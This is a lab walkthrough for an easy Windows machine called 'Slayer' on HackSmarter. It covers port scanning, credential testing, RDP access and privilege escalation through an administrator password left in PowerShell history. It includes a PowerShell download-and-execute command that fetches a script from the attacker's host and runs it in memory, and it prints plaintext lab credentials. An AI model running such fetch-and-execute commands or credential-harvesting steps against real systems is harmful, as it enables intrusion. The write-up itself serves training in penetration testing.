---
tags:
  - Lab
  - HackSmarter
Username: tyler.ramsey
Password: P@ssw0rd!
MachineName: Slayer
TargetIP: 10.1.146.220
KaliIP: 10.200.32.9
---

## Slayer - Lab Machine
resources: [RustScan](https://github.com/RustScan/RustScan), [feroxbuster](https://github.com/epi052/feroxbuster), [nikto](https://github.com/sullo/nikto), [ffuf](https://github.com/ffuf/ffuf), [nmap](https://github.com/nmap/nmap), [SecLists](https://github.com/danielmiessler/SecLists), [authfinder](https://github.com/Real-Fruit-Snacks/authfinder), [nxc_enum](https://github.com/Real-Fruit-Snacks/nxc_enum)
### Machine Info
> - **Platform**: HackSmarter
> - **Difficulty**: Easy
> - **OS**: Windows
> - **IP Address**: 10.1.146.220
> - **Date Started**: 01-27-2026
> - **Date Completed**: 01-27-2026
> - **User Flag**: N/A
> - **Root Flag**: `3835538****************9ef125496`

### Scenario Description
> [!info] Following a successful social engineering engagement, you have obtained user-level credentials for a corporate workstation. Your objective is to leverage this initial access to perform deep reconnaissance on the internal Windows host. The final goal is to escalate privileges and capture the root flag from the administrator's directory to demonstrate full system compromise.
### Provided Credentials [optional]

#### Username

```bash
tyler.ramsey
```

#### Password

```bash
P@ssw0rd!
```

### Create Directory Structure

```bash
mkdir -p /root/machines/Slayer/10.1.146.220/{logs,web,scan,nxc,exploit,bloodhound,loot,privesc,www} && cd /root/machines/Slayer/10.1.146.220 && touch usernames passwords confirmedCreds notes && ls -latr
```

### Launch Logged Terminal Tabs

```bash
TS=$(date +%Y%m%d_%H%M) && xfce4-terminal --maximize --hide-menubar --hide-toolbar --working-directory=/root/machines/Slayer/10.1.146.220/ --title="Shell" -e "script -q -f /root/machines/Slayer/10.1.146.220/logs/shell_$TS.log" --tab --working-directory=/root/machines/Slayer/10.1.146.220/scan --title="Scan" -e "script -q -f /root/machines/Slayer/10.1.146.220/logs/scan_$TS.log -c 'rustscan -a 10.1.146.220 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN /root/machines/Slayer/10.1.146.220/scan/tcp.txt; exec bash'" --tab --working-directory=/root/machines/Slayer/10.1.146.220/nxc --title="NXC" -e "script -q -f /root/machines/Slayer/10.1.146.220/logs/nxc_$TS.log" --tab --working-directory=/root/machines/Slayer/10.1.146.220/web --title="Web" -e "script -q -f /root/machines/Slayer/10.1.146.220/logs/web_$TS.log" --tab --working-directory=/root/machines/Slayer/10.1.146.220/exploit --title="Exploit" -e "script -q -f /root/machines/Slayer/10.1.146.220/logs/exploit_$TS.log" --tab --working-directory=/root/machines/Slayer/10.1.146.220/ --title="Notes"
```

### Maximize Terminal Window [optional]

```bash
wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz
```

### Enumeration
#### RustScan TCP

```bash
rustscan -a 10.1.146.220 --ulimit 5000 -b 1500 -- -sC -sV -Pn -oN scan.txt
```

```text
# Output
Open 10.1.146.220:135
Open 10.1.146.220:445
Open 10.1.146.220:3389
Open 10.1.146.220:49669


Nmap scan report for EC2AMAZ-M1LFCNO.EC2AMAZ-M1LFCNO (10.1.146.220)

PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack ttl 126
3389/tcp open  ms-wbt-server syn-ack ttl 126
```

#### Nmap UDP

```bash
nmap -sU --top-ports 20 -sV 10.1.146.220 -oN udp_scan.txt
```

```text
# Output
PORT      STATE         SERVICE      VERSION
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
```

#### authfinder [optional]

```bash
cd /opt/authfinder && python3 authfinder.py 10.1.146.220 'tyler.ramsey' 'P@ssw0rd!'
```

```text
# Output
[Target] 10.1.146.220 | User: tyler.ramsey
    Service      Auth     Exec       Notes
    ──────────── ──────── ────────── ─────────────────────────
    winrm        FAILED   -          timed out
    smbexec      OK       FAILED     command failed (check permissions)
    wmi          OK       FAILED     WMI exec failed
    ssh          FAILED   -          timed out
    mssql        FAILED   -          timed out
    psexec       OK       FAILED     no writable shares
    atexec       OK       FAILED     task creation denied
    rdp          OK       FAILED     exec failed. Try manual RDP.

```

> [!tip] Can try manual RDP...

---

### RDP

```bash
xfreerdp3 /u:tyler.ramsey /p:'P@ssw0rd!' /v:10.1.146.220 /dynamic-resolution +clipboard /cert:ignore
```

> [!important] RDP Works

---

## Windows PrivEsc Checklist (Unprivileged User)
resources: [Latch GitHub](https://github.com/Real-Fruit-Snacks/Latch), [HackTricks PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

> [!tip] All commands output to files for organized enumeration. Check **SeImpersonatePrivilege** first - if present, jump to Potato Attacks.
### Initial Situational Awareness
```bash
# Locally
cd /opt/powershellSurvey && ./serve-tools.sh -d /opt
```
### Latch Survey Script
#### In Memory
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.200.32.9/Latch.ps1')"
```

```bash
# Latch Output
==============================================================
    Latch - Windows PrivEsc Enumeration
    Output: .\LatchOutput
    Admin: NO | Domain Joined: NO
==============================================================
[!] Not running as admin - some checks will be limited
[02:12:25][6%] [*] Gathering system information...
[02:12:30][6%] [+] System info saved to sysinfo.txt
[02:12:30][12%] [*] Gathering network information...
[02:12:32][12%] [+] Network info saved to network.txt
[02:12:32][19%] [*] Checking installed patches...
[02:12:34][19%] [+] Patches saved to patches.txt
[02:12:34][25%] [*] Checking quick win locations...
[02:12:34][25%] [+] Quick wins saved to quickwins.txt
[02:12:34][31%] [*] Checking for unattend files...
[02:15:15][31%] [+] Unattend check saved to unattend.txt
[02:15:15][38%] [*] Checking for web config files...
[02:15:15][38%] [+] Web configs saved to webconfigs.txt
[02:15:15][44%] [*] Enumerating services...
[02:15:16][44%] [+] Services saved to services_*.txt
[02:15:16][50%] [*] Enumerating scheduled tasks...
[02:15:22][50%] [+] Scheduled tasks saved to schtasks_*.txt
[02:15:22][56%] [*] Checking autorun locations...
[02:15:22][56%] [+] Autoruns saved to autoruns.txt
[02:15:22][62%] [*] Checking AlwaysInstallElevated...
[02:15:22][62%] [+] AlwaysInstallElevated check saved
[02:15:22][69%] [*] Enumerating installed software...
[02:15:22][69%] [+] Software list saved to software.txt
[02:15:22][75%] [*] Enumerating processes...
[02:15:22][75%] [+] Processes saved to processes.txt
[02:15:22][81%] [*] Checking PATH for writable directories...
[02:15:23][81%] [!] FOUND: 1 writable PATH directories
[02:15:23][81%] [+] DLL hijack check saved to dll_hijack.txt
[02:15:23][88%] [*] Generating directory trees...
[02:15:23][88%] [+] Directory tree saved to tree_all.txt

============================================================
  LATCH COMPLETE
============================================================
  Output: .\LatchOutput

  Review these files:
    type .\LatchOutput\sysinfo.txt
    type .\LatchOutput\quickwins.txt
    type .\LatchOutput\services_nonstandard.txt
```

```bash
# Quick Wins File Content.
=== POWERSHELL HISTORY ===
net user administrator "ebz0yxy3txh9BDE*yeh"
```

> [!important] Potential Administrator Login Credentials. I tried launching an `Administrator` cmd.exe but the username/password failed. Going to throw **authfinder**.

```bash
cd /opt/authfinder && python3 authfinder.py 10.1.146.220 'administrator' 'ebz0yxy3txh9BDE*yeh'
```

```bash
#Output
[Target] 10.1.146.220 | User: administrator
    Service      Auth     Exec       Notes
    ──────────── ──────── ────────── ─────────────────────────
    smbexec      FAILED   -          
    wmi          OK       FAILED     WMI exec failed
    psexec       FAILED   -          timed out
    atexec       OK       OK        
    rdp          OK       FAILED     exec failed. Try manual RDP.
```

> [!tip] Can try manual RDP...

```bash
xfreerdp3 /u:administrator /p:'ebz0yxy3txh9BDE*yeh' /v:10.1.146.220 /dynamic-resolution +clipboard /cert:ignore
```

> [!important] Logged in as Administrator!
### Flag!

```bash
C:\Users\Administrator>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::ca4d:faa2:112b:22eb%3
   IPv4 Address. . . . . . . . . . . : 10.1.146.220
   Subnet Mask . . . . . . . . . . . : 255.255.192.0
   Default Gateway . . . . . . . . . : 10.1.128.1

C:\Users\Administrator>whoami
ec2amaz-m1lfcno\administrator

C:\Users\Administrator>type Desktop\root.txt
3835538****************9ef125496
```
---

## Lessons Learned
> [!important] Always check for low hanging fruit first. PowerShell history can contain credentials. 
